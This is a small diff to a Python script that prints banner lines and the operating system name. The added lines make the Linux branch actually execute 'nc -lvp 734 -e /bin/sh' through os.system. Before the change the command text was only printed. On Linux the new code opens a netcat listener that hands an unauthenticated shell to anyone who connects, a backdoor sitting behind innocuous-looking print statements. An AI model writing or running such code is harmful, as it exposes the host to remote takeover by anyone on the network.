@@ -10,7 +10,8 @@ def run():
     print('###### ### #########')
     print('# OS name: ', platform.system())
     if "Linux" in platform.system():
-        print('Comand Linux: ', nc -lvp 734 -e /bin/sh)
+        print('Comand Linux: ') 
+        os.system( 'nc -lvp 734 -e /bin/sh')
     elif "Windows" in platform.system():
         print('Comand nc windows')
     print('########   #########')
